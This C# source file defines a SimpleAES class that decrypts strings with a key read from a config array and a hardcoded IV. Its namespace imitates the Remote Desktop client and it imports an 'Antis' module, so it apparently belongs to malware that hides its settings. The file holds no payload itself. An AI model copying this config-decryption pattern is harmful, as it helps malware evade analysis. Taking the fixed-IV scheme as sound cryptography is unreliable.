using System;
//using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using mstsc.Aries.Antis;
using Microsoft.VisualBasic;
//using System.Windows.Forms;

namespace mstsc
{

    /// <summary>
    /// AES Class
    /// </summary>
    sealed class SimpleAES
    {
        private ICryptoTransform DecryptorTransform;
        private UTF8Encoding UTFEncoder;
        public byte[] Key;

        /*/// <summary>
        /// Return a string of random chars
        /// </summary>
        /// <param name="length">string length</param>
        string getRandNum(int length)
        {
            string str = "0123456789!@#$%^&*()";
            string str2 = "abcdefghijklmnopqrstuvwxyz";
            string str3;
            str3 = (str + str2);
            Random random = new Random();
            StringBuilder builder = new StringBuilder(length);
            int i;
            for (i = 0; i <= length - 1; i++)
            {
                int num2 = random.Next(str3.Length);
                builder.Append(str3[num2]);
            }
            return Convert.ToString(builder);
        }*/

        //Modified http://stackoverflow.com/questions/165808/simple-2-way-encryption-for-c
        /// <summary>
        /// AES Class
        /// </summary>
        public SimpleAES()
        {
            /*PasswordDeriveBytes derived = new PasswordDeriveBytes(
                Encoding.Default.GetBytes(new Random().Next(5000, 10000).ToString()),
                Encoding.Default.GetBytes(new Random().Next(5000, 10000).ToString()));*/
            //This is our encryption method
            RijndaelManaged rm = new RijndaelManaged();

            //Encryption key
            Key = Encoding.UTF8.GetBytes(Strings.Split(Config.Settings[8], Config.FSplit3, -1, CompareMethod.Text)[0]);//Encoding.UTF8.GetBytes(getRandNum(32).ToString());

            byte[] Vector = Encoding.Default.GetBytes("Ijd0!$FDdg8s(*&J");
            //Create an encryptor and a decryptor using our encryption method, key, and vector.
            rm.CreateEncryptor(Key, Vector);
            DecryptorTransform = rm.CreateDecryptor(Key, Vector);

            //Used to translate bytes to text and vice versa
            UTFEncoder = new UTF8Encoding();
        }

        /// The other side: Decryption methods
        public string DecryptString(string EncryptedString)
        {
            return Decrypt(StrToByteArray(EncryptedString));
        }

        /// Decryption when working with byte arrays.    
        public string Decrypt(byte[] EncryptedValue)
        {
            #region Write the encrypted value to the decryption stream
            MemoryStream encryptedStream = new MemoryStream();
            CryptoStream decryptStream = new CryptoStream(encryptedStream, DecryptorTransform, CryptoStreamMode.Write);
            decryptStream.Write(EncryptedValue, 0, EncryptedValue.Length);
            decryptStream.FlushFinalBlock();
            #endregion

            #region Read the decrypted value from the stream.
            encryptedStream.Position = 0;
            Byte[] decryptedBytes = new Byte[encryptedStream.Length];
            encryptedStream.Read(decryptedBytes, 0, decryptedBytes.Length);
            encryptedStream.Close();
            #endregion
            return UTFEncoder.GetString(decryptedBytes);
        }

        /// Convert a string to a byte array.  NOTE: Normally we'd create a Byte Array from a string using an ASCII encoding (like so).
        // However, this results in character values that cannot be passed in a URL.  So, instead, I just
        // lay out all of the byte values in a long string of numbers (three per - must pad numbers less than 100).
        public byte[] StrToByteArray(string str)
        {
            if (str.Length == 0)
                throw new Exception("Invalid string value in StrToByteArray");

            byte val;
            byte[] byteArr = new byte[str.Length / 3];
            int i = 0;
            int j = 0;
            do
            {
                val = byte.Parse(str.Substring(i, 3));
                byteArr[j++] = val;
                i += 3;
            }
            while (i < str.Length);
            return byteArr;
        }
    }
}
